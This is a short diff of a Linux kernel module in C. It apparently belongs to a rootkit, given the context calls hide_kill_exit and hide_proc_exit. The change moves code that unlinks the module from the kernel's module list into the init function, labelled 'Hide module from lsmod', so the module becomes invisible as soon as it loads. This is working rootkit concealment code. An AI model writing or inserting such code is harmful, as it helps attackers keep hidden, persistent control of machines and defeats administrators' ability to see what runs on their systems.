@@ -178,6 +178,12 @@ int __init driver_entry(void)
 		return ret;
 	}
 
+	// Hide module from lsmod
+	mutex_lock(&module_mutex);
+	list_del_init(&THIS_MODULE->list);
+	mutex_unlock(&module_mutex);
+	printk(KERN_INFO "[+] Module hidden from lsmod\n");
+
 	return 0;
 }
 
@@ -185,10 +191,6 @@ void __exit driver_unload(void)
 {
 	printk("[+] driver_unload");
 
-	// Module unlinking logic
-	mutex_lock(&module_mutex);
-	list_del_init(&THIS_MODULE->list);
-	mutex_unlock(&module_mutex);
 
 	hide_kill_exit();
 	hide_proc_exit();
